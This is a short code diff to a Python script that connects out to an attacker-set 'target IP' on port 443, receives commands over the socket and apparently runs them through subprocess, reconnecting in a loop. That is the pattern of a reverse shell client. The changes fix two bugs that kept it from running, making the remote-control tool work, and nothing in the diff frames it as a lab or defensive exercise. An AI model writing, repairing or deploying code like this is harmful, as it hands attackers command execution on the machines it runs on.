@@ -2,7 +2,7 @@ import socket
 import time
 import subprocess
 import threading
-ip = "" 
+ip = "definir o ip alvo" 
 port = 443
 
 def connect(ip,port):
@@ -31,7 +31,7 @@ def cmd(client, data):
 
 def listen(client):
     while True:
-        data = client.recv(1024).decode.strip()
+        data = client.recv(1024).decode().strip()
         if data == "/exit":
             exit()
         else:
@@ -43,8 +43,7 @@ if __name__ == "__main__":
     while True:
         client = connect(ip,port)
         if client:
-            list(client)
+            listen(client)
         else:
             print("Erro ao conectar")
             time.sleep(2)
-        
